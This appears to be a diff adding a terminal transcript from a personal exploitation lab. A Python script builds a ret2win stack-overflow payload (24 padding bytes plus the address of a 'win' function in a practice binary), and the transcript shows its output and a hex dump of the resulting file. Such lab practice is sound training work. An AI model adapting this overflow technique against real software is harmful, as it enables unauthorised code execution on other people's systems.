@@ -1,0 +1,17 @@
+mzj@Ubuntu-24.04:~$ cat ~/pwn-lab/make_payload.py
+import struct
+win = 0x401190              # from: nm overflow | grep win   (this build only!)
+payload = b"A" * 24 + struct.pack("<Q", win)
+open("payload.bin", "wb").write(payload)
+print("win address   =", hex(win))
+print("payload len   =", len(payload))
+print("payload hex   =", payload.hex())
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && python3 make_payload.py
+win address   = 0x401190
+payload len   = 32
+payload hex   = 4141414141414141414141414141414141414141414141419011400000000000
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && xxd payload.bin
+00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000010: 4141 4141 4141 4141 9011 4000 0000 0000  AAAAAAAA..@.....
